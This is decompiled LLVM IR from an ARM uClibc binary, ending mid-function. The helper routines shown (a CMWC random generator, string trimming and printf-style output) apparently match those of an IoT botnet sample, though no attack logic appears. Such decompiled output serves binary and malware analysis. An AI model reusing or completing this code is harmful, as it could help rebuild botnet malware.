@global_var_153dc.577 = constant i32 -443088884
@global_var_17bd4.626 = constant i32 -382909456
@global_var_fa44.650 = constant i32 -382910336
@global_var_19038.655 = constant i32 -442695584
@global_var_19600.664 = constant i32 -382910224
@global_var_1a454.690 = constant i32 -504313148
@global_var_1a43c.691 = constant i32 -483131392
@global_var_1a2e8.692 = constant i32 -481229311
@global_var_1a4c4.693 = constant i32 -477817729
@global_var_1a5c4.694 = constant i32 -476034303
@global_var_1a800.695 = constant i32 -516685812
@global_var_1a6f4.696 = constant i32 -905969571
@global_var_1a628.697 = constant i32 -528203771
@global_var_1a888.698 = constant i32 -478079873
@global_var_1a86c.699 = constant i32 -534704125
@global_var_1a81c.700 = constant i32 -534704125
@global_var_1a7b4.701 = constant i32 -483131392
@global_var_26478.4 = external global i8*
@global_var_264b3.69 = external global i8*
@global_var_264b4.71 = local_unnamed_addr global i8 0
@global_var_264b5.72 = local_unnamed_addr global i8 0
@global_var_264b6.73 = local_unnamed_addr global i8 0
@global_var_26010.295 = global i16 0
@global_var_1c3c0.265 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d4 = load i32, i32* @r0, align 4
  ret i32 %v1_80d4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d8 = load i32, i32* @r0, align 4
  ret i32 %v1_80d8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80dc = load i32, i32* @r0, align 4
  ret i32 %v1_80dc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_80e0 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_80e0)
  %v1_80e0 = load i32, i32* @r0, align 4
  ret i32 %v1_80e0
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_80e4 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v1_80e4 = load i32, i32* @r0, align 4
  ret i32 %v1_80e4
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_80e8 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_80e8)
  %v1_80e8 = load i32, i32* @r0, align 4
  ret i32 %v1_80e8
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_80ec = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_80ec)
  %v1_80ec = load i32, i32* @r0, align 4
  ret i32 %v1_80ec
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_80f0 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_80f0)
  %v1_80f0 = load i32, i32* @r0, align 4
  ret i32 %v1_80f0
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_80f4 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_80f4)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_80f8 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_80f8)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_80fc = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_80fc)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_810c = load i32, i32* @r4, align 4
  store i32 %v3_810c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_26478.4 to i32), i32* %r4.global-to-local, align 4
  %v2_8114 = load i8, i8* bitcast (i8** @global_var_26478.4 to i8*), align 4
  %v2_8118 = icmp eq i8 %v2_8114, 0
  br i1 %v2_8118, label %dec_label_pc_8120, label %dec_label_pc_813c

dec_label_pc_8120:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8138 = load i32, i32* %r4.global-to-local, align 4
  %v3_8138 = inttoptr i32 %v2_8138 to i8*
  store i8 1, i8* %v3_8138, align 1
  %v2_813c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_813c

dec_label_pc_813c:                                ; preds = %entry, %dec_label_pc_8120
  %v2_813c = phi i32 [ %v3_810c, %entry ], [ %v2_813c.pre, %dec_label_pc_8120 ]
  store i32 %v2_813c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_26478.4, { 1, 0 }
  uselistorder label %dec_label_pc_813c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8174 = load i32, i32* @global_var_2600c.14, align 4
  %v2_8178 = icmp eq i32 %v2_8174, 0
  br i1 %v2_8178, label %dec_label_pc_8190, label %dec_label_pc_8180

dec_label_pc_8180:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8190

dec_label_pc_8190:                                ; preds = %bb, %dec_label_pc_8180
  ret i32 ptrtoint (i32* @global_var_2600c.14 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2600c.14, { 1, 0 }
  uselistorder label %dec_label_pc_8190, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81d8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_e698.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32948, i32 109624, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @abort()
  ret i32 %v0_81dc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81fc, i32* @global_var_264b8.21, align 4
  %v1_821c = add i32 %v0_81fc, -1640531527
  store i32 %v1_821c, i32* @global_var_264bc.22, align 4
  %v1_8238 = add i32 %v0_81fc, 1013904242
  store i32 %v1_8238, i32* @global_var_264c0.23, align 4
  br label %dec_label_pc_8250

dec_label_pc_8250:                                ; preds = %entry, %dec_label_pc_8250
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8294, %dec_label_pc_8250 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8260 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_264b8.21 to i32), i32 -12)
  %v6_8260 = inttoptr i32 %v5_8260 to i32*
  %v7_8260 = load i32, i32* %v6_8260, align 4
  %tmp10 = mul i32 %storemerge12, 4
  %v5_8270 = add i32 %tmp10, add (i32 ptrtoint (i32* @global_var_264b8.21 to i32), i32 -8)
  %v6_8270 = inttoptr i32 %v5_8270 to i32*
  %v7_8270 = load i32, i32* %v6_8270, align 4
  %v2_8274 = xor i32 %storemerge12, -1640531527
  %v2_827c = xor i32 %v2_8274, %v7_8260
  %v2_8284 = xor i32 %v2_827c, %v7_8270
  %v5_828c = mul nuw nsw i32 %storemerge12, 4
  %v6_828c = add i32 %v5_828c, ptrtoint (i32* @global_var_264b8.21 to i32)
  %v7_828c = inttoptr i32 %v6_828c to i32*
  store i32 %v2_8284, i32* %v7_828c, align 4
  %v1_8294 = add nuw nsw i32 %storemerge12, 1
  %v7_82ac = icmp slt i32 %v1_8294, 4096
  br i1 %v7_82ac, label %dec_label_pc_8250, label %dec_label_pc_82b0

dec_label_pc_82b0:                                ; preds = %dec_label_pc_8250
  %v1_82b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_82b8

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8250, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %v2_82f4 = load i32, i32* @global_var_26214.26, align 4
  %v1_82f8 = add i32 %v2_82f4, 1
  %v3_8300 = urem i32 %v1_82f8, 4096
  store i32 %v3_8300, i32* @global_var_26214.26, align 4
  %v4_8318 = mul nuw nsw i32 %v3_8300, 4
  %v5_8318 = add i32 %v4_8318, ptrtoint (i32* @global_var_264b8.21 to i32)
  %v6_8318 = inttoptr i32 %v5_8318 to i32*
  %v7_8318 = load i32, i32* %v6_8318, align 4
  %v6_8338 = udiv i32 %v7_8318, 228675
  store i32 %v6_8338, i32* @global_var_26210.29, align 4
  br i1 true, label %dec_label_pc_83c8, label %dec_label_pc_83a8

dec_label_pc_83a8:                                ; preds = %entry
  br label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %entry, %dec_label_pc_83a8
  %v4_83e8 = mul nuw nsw i32 %v3_8300, 4
  %v5_83e8 = add i32 %v4_83e8, ptrtoint (i32* @global_var_264b8.21 to i32)
  %v6_83e8 = inttoptr i32 %v5_83e8 to i32*
  %v7_83e8 = load i32, i32* %v6_83e8, align 4
  ret i32 %v7_83e8

; uselistorder directives
  uselistorder i32 %v3_8300, { 0, 2, 1 }
  uselistorder i32* @global_var_264b8.21, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_264b8.21 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_83c8, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_8428 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8448

dec_label_pc_8448:                                ; preds = %dec_label_pc_8448, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8440, %dec_label_pc_8448 ]
  %v2_8454 = add i32 %stack_var_-24.0, %tmp
  %v1_8458 = inttoptr i32 %v2_8454 to i8*
  %v2_8458 = load i8, i8* %v1_8458, align 1
  %v3_8458 = zext i8 %v2_8458 to i32
  store i32 %v3_8458, i32* %r0.global-to-local, align 4
  %v1_8460 = call i32 @isspace(i32 %v3_8458)
  store i32 %v1_8460, i32* %r0.global-to-local, align 4
  %v2_8468 = icmp eq i32 %v1_8460, 0
  %v1_8440 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8468, label %dec_label_pc_8480.preheader, label %dec_label_pc_8448

dec_label_pc_8480.preheader:                      ; preds = %dec_label_pc_8448
  %v1_8430 = add i32 %v3_8428, -1
  %v5_848c11 = icmp slt i32 %v1_8430, %stack_var_-24.0
  br i1 %v5_848c11, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8474:                                ; preds = %dec_label_pc_8490
  %v1_8478 = add i32 %stack_var_-20.012, -1
  %v5_848c = icmp slt i32 %v1_8478, %stack_var_-24.0
  br i1 %v5_848c, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8480.preheader, %dec_label_pc_8474
  %stack_var_-20.012 = phi i32 [ %v1_8478, %dec_label_pc_8474 ], [ %v1_8430, %dec_label_pc_8480.preheader ]
  %v2_849c = add i32 %stack_var_-20.012, %tmp
  %v1_84a0 = inttoptr i32 %v2_849c to i8*
  %v2_84a0 = load i8, i8* %v1_84a0, align 1
  %v3_84a0 = zext i8 %v2_84a0 to i32
  store i32 %v3_84a0, i32* %r0.global-to-local, align 4
  %v1_84a8 = call i32 @isspace(i32 %v3_84a0)
  store i32 %v1_84a8, i32* %r0.global-to-local, align 4
  %v2_84b0 = icmp eq i32 %v1_84a8, 0
  br i1 %v2_84b0, label %dec_label_pc_8500.preheader, label %dec_label_pc_8474

dec_label_pc_8500.preheader:                      ; preds = %dec_label_pc_8474, %dec_label_pc_8490, %dec_label_pc_8480.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8430, %dec_label_pc_8480.preheader ], [ %v1_8478, %dec_label_pc_8474 ], [ %stack_var_-20.012, %dec_label_pc_8490 ]
  br label %dec_label_pc_8500

dec_label_pc_84c4:                                ; preds = %dec_label_pc_8500
  %v2_84e8 = add i32 %storemerge2, %tmp
  %v1_84ec = inttoptr i32 %v2_84e8 to i8*
  %v2_84ec = load i8, i8* %v1_84ec, align 1
  %v3_84f0 = inttoptr i32 %v2_8524 to i8*
  store i8 %v2_84ec, i8* %v3_84f0, align 1
  %v1_84f8 = add i32 %storemerge2, 1
  br label %dec_label_pc_8500

dec_label_pc_8500:                                ; preds = %dec_label_pc_8500.preheader, %dec_label_pc_84c4
  %storemerge2 = phi i32 [ %v1_84f8, %dec_label_pc_84c4 ], [ %stack_var_-24.0, %dec_label_pc_8500.preheader ]
  %v7_850c = icmp sgt i32 %storemerge2, %stack_var_-20.0.lcssa
  %v2_8518 = sub i32 %storemerge2, %stack_var_-24.0
  %v2_8524 = add i32 %v2_8518, %tmp
  br i1 %v7_850c, label %dec_label_pc_8510, label %dec_label_pc_84c4

dec_label_pc_8510:                                ; preds = %dec_label_pc_8500
  %v3_852c = inttoptr i32 %v2_8524 to i8*
  store i8 0, i8* %v3_852c, align 1
  %v1_8538 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_8538

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8430, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8500, { 1, 0 }
  uselistorder label %dec_label_pc_8500.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8490, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_854c = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8558 = icmp eq i32 %v0_854c, 0
  br i1 %v2_8558, label %dec_label_pc_858c, label %dec_label_pc_8560

dec_label_pc_8560:                                ; preds = %entry
  %v1_8564 = inttoptr i32 %v0_854c to i32*
  %v2_8564 = load i32, i32* %v1_8564, align 4
  %v1_8570 = trunc i32 %arg2 to i8
  %v3_8570 = inttoptr i32 %v2_8564 to i8*
  store i8 %v1_8570, i8* %v3_8570, align 1
  %v2_8578 = load i32, i32* %v1_8564, align 4
  %v1_857c = add i32 %v2_8578, 1
  store i32 %v1_857c, i32* %v1_8564, align 4
  %v1_85a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_858c:                                ; preds = %entry
  %v2_8548 = ptrtoint i32* %stack_var_-24 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_859c = call i32 @__GI_write(i32 1, i32 %v2_8548)
  store i32 %v2_859c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8560, %dec_label_pc_858c
  %v1_85a8 = phi i32 [ %v1_85a8.pre, %dec_label_pc_8560 ], [ %v2_859c, %dec_label_pc_858c ]
  ret i32 %v1_85a8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_85a0, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %v3_85b0 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_8668, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %entry
  %v2_861819 = load i8, i8* %arg2, align 1
  %v2_861c21 = icmp eq i8 %v2_861819, 0
  br i1 %v2_861c21, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_85fc:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_85fc
  %v4_861423 = phi i32 [ %v1_860c, %dec_label_pc_85fc ], [ %tmp, %dec_label_pc_85e8 ]
  %stack_var_-40.022 = phi i32 [ %v1_8600, %dec_label_pc_85fc ], [ 0, %dec_label_pc_85e8 ]
  %v1_8600 = add i32 %stack_var_-40.022, 1
  %v1_860c = add i32 %v4_861423, 1
  %v5_8610 = inttoptr i32 %v1_860c to i8*
  %v2_8618 = load i8, i8* %v5_8610, align 1
  %v2_861c = icmp eq i8 %v2_8618, 0
  br i1 %v2_861c, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_8624:                                ; preds = %dec_label_pc_85fc, %dec_label_pc_85e8
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85e8 ], [ %v1_8600, %dec_label_pc_85fc ]
  %v5_8630 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8630, label %dec_label_pc_8640, label %dec_label_pc_8650

dec_label_pc_8640:                                ; preds = %dec_label_pc_8624
  %v2_8648 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8650

dec_label_pc_8650:                                ; preds = %dec_label_pc_8624, %dec_label_pc_8640
  %storemerge3 = phi i32 [ %v2_8648, %dec_label_pc_8640 ], [ 0, %dec_label_pc_8624 ]
  %v1_8654 = and i32 %arg4, 2
  %v2_8658 = icmp eq i32 %v1_8654, 0
  br i1 %v2_8658, label %dec_label_pc_8668, label %dec_label_pc_8660

dec_label_pc_8660:                                ; preds = %dec_label_pc_8650
  br label %dec_label_pc_8668

dec_label_pc_8668:                                ; preds = %dec_label_pc_8650, %entry, %dec_label_pc_8660
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_8650 ], [ %storemerge3, %dec_label_pc_8660 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8650 ], [ 48, %dec_label_pc_8660 ]
  %v1_866c = urem i32 %arg4, 2
  %v2_8670 = icmp eq i32 %v1_866c, 0
  br i1 %v2_8670, label %dec_label_pc_86a0.preheader, label %dec_label_pc_86dc.preheader

dec_label_pc_86a0.preheader:                      ; preds = %dec_label_pc_8668
  %v5_86a816 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_86a816, label %dec_label_pc_867c.lr.ph, label %dec_label_pc_86dc.preheader

dec_label_pc_867c.lr.ph:                          ; preds = %dec_label_pc_86a0.preheader
  %v2_8684 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_867c

dec_label_pc_867c:                                ; preds = %dec_label_pc_867c.lr.ph, %dec_label_pc_867c
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_867c.lr.ph ], [ %v1_8698, %dec_label_pc_867c ]
  %v3_8684 = call i32 @printchar(i32* %v2_8684, i32 %stack_var_-44.0)
  %v3_8688 = load i32, i32* %stack_var_-48, align 4
  %v1_868c = add i32 %v3_8688, 1
  store i32 %v1_868c, i32* %stack_var_-48, align 4
  %v1_8698 = add nsw i32 %stack_var_-28.117, -1
  %v5_86a8 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_86a8, label %dec_label_pc_867c, label %dec_label_pc_86dc.preheader

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_867c, %dec_label_pc_86a0.preheader, %dec_label_pc_8668
  %v3_872027 = phi i32 [ 0, %dec_label_pc_8668 ], [ 0, %dec_label_pc_86a0.preheader ], [ %v1_868c, %dec_label_pc_867c ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8668 ], [ %stack_var_-28.0, %dec_label_pc_86a0.preheader ], [ 0, %dec_label_pc_867c ]
  %v2_86e09 = load i8, i8* %arg2, align 1
  %v2_86e411 = icmp eq i8 %v2_86e09, 0
  br i1 %v2_86e411, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0.lr.ph

dec_label_pc_86b0.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b0

dec_label_pc_86b0:                                ; preds = %dec_label_pc_86b0.lr.ph, %dec_label_pc_86b0
  %v4_86dc13 = phi i32 [ %tmp, %dec_label_pc_86b0.lr.ph ], [ %v1_86d4, %dec_label_pc_86b0 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_86b0.lr.ph ], [ %v5_86d8, %dec_label_pc_86b0 ]
  %v2_86b4 = load i8, i8* %stack_var_-24.012, align 1
  %v3_86b4 = zext i8 %v2_86b4 to i32
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %v3_86b4)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add i32 %v4_86dc13, 1
  %v5_86d8 = inttoptr i32 %v1_86d4 to i8*
  %v2_86e0 = load i8, i8* %v5_86d8, align 1
  %v2_86e4 = icmp eq i8 %v2_86e0, 0
  br i1 %v2_86e4, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0

dec_label_pc_8714.preheader:                      ; preds = %dec_label_pc_86b0, %dec_label_pc_86dc.preheader
  %v3_872026 = phi i32 [ %v3_872027, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b0 ]
  %v5_871c6 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_871c6, label %dec_label_pc_86f0.lr.ph, label %dec_label_pc_8720

dec_label_pc_86f0.lr.ph:                          ; preds = %dec_label_pc_8714.preheader
  %v2_86f8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86f0

dec_label_pc_86f0:                                ; preds = %dec_label_pc_86f0.lr.ph, %dec_label_pc_86f0
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86f0.lr.ph ], [ %v1_870c, %dec_label_pc_86f0 ]
  %v3_86f8 = call i32 @printchar(i32* %v2_86f8, i32 %stack_var_-44.0)
  %v3_86fc = load i32, i32* %stack_var_-48, align 4
  %v1_8700 = add i32 %v3_86fc, 1
  store i32 %v1_8700, i32* %stack_var_-48, align 4
  %v1_870c = add nsw i32 %stack_var_-28.37, -1
  %v5_871c = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_871c, label %dec_label_pc_86f0, label %dec_label_pc_8720

dec_label_pc_8720:                                ; preds = %dec_label_pc_86f0, %dec_label_pc_8714.preheader
  %v3_8720 = phi i32 [ %v3_872026, %dec_label_pc_8714.preheader ], [ %v1_8700, %dec_label_pc_86f0 ]
  store i32 %v3_85b0, i32* @fp, align 4
  ret i32 %v3_8720

; uselistorder directives
  uselistorder i32 %v1_86d4, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_860c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86f0, { 1, 0 }
  uselistorder label %dec_label_pc_86b0, { 1, 0 }
  uselistorder label %dec_label_pc_867c, { 1, 0 }
  uselistorder label %dec_label_pc_8668, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8650, { 1, 0 }
  uselistorder label %dec_label_pc_85fc, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_8738 = load i32, i32* @fp, align 4
  store i32 34624, i32* %stack_var_-4, align 4
  %v2_873c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_873c, i32* @fp, align 4
  %v1_8770 = icmp slt i32 %arg2, 0
  %v2_8770 = icmp eq i32 %arg2, 0
  br i1 %v2_8770, label %dec_label_pc_8778, label %dec_label_pc_87ac

dec_label_pc_8778:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_879c = bitcast i32* %stack_var_-28 to i8*
  %v6_879c = call i32 @prints(i32 %arg1, i8* %v5_879c, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_890c

dec_label_pc_87ac:                                ; preds = %entry
  %v2_87b0 = icmp eq i32 %arg4, 0
  br i1 %v2_87b0, label %dec_label_pc_87e4, label %dec_label_pc_87b8

dec_label_pc_87b8:                                ; preds = %dec_label_pc_87ac
  %v7_87bc = icmp eq i32 %arg3, 10
  br i1 %v7_87bc, label %dec_label_pc_87c4, label %dec_label_pc_87e4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87b8
  br i1 %v1_8770, label %dec_label_pc_87d0, label %dec_label_pc_87e4

dec_label_pc_87d0:                                ; preds = %dec_label_pc_87c4
  %v1_87dc = sub i32 0, %arg2
  br label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87b8, %dec_label_pc_87ac, %dec_label_pc_87d0
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_87ac ], [ %v1_87dc, %dec_label_pc_87d0 ], [ %arg2, %dec_label_pc_87c4 ], [ %arg2, %dec_label_pc_87b8 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_87ac ], [ 1, %dec_label_pc_87d0 ], [ 0, %dec_label_pc_87c4 ], [ 0, %dec_label_pc_87b8 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_88784 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_88784, label %dec_label_pc_8880, label %dec_label_pc_8800.lr.ph

dec_label_pc_8800.lr.ph:                          ; preds = %dec_label_pc_87e4
  %v1_8828 = add i32 %arg7, -58
  br label %dec_label_pc_8800

dec_label_pc_8800:                                ; preds = %dec_label_pc_8800.lr.ph, %dec_label_pc_8838
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_8800.lr.ph ], [ %v2_880c, %dec_label_pc_8838 ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_8800.lr.ph ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_880c = udiv i32 %stack_var_-52.16, %arg3
  %v3_880c = urem i32 %stack_var_-52.16, %arg3
  %v7_8820 = icmp slt i32 %v3_880c, 10
  br i1 %v7_8820, label %dec_label_pc_8838, label %dec_label_pc_8824

dec_label_pc_8824:                                ; preds = %dec_label_pc_8800
  %v2_8830 = add i32 %v3_880c, %v1_8828
  br label %dec_label_pc_8838

dec_label_pc_8838:                                ; preds = %dec_label_pc_8800, %dec_label_pc_8824
  %stack_var_-64.0 = phi i32 [ %v3_880c, %dec_label_pc_8800 ], [ %v2_8830, %dec_label_pc_8824 ]
  %v4_8838 = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_883c = add i32 %v4_8838, -1
  %v5_8840 = inttoptr i32 %v1_883c to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_8858 = trunc i32 %fold to i8
  store i8 %v1_8858, i8* %v5_8840, align 1
  %v2_8878 = icmp ult i32 %stack_var_-52.16, %arg3
  br i1 %v2_8878, label %dec_label_pc_8880, label %dec_label_pc_8800

dec_label_pc_8880:                                ; preds = %dec_label_pc_8838, %dec_label_pc_87e4
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87e4 ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_8884 = icmp eq i32 %stack_var_-60.0, 0
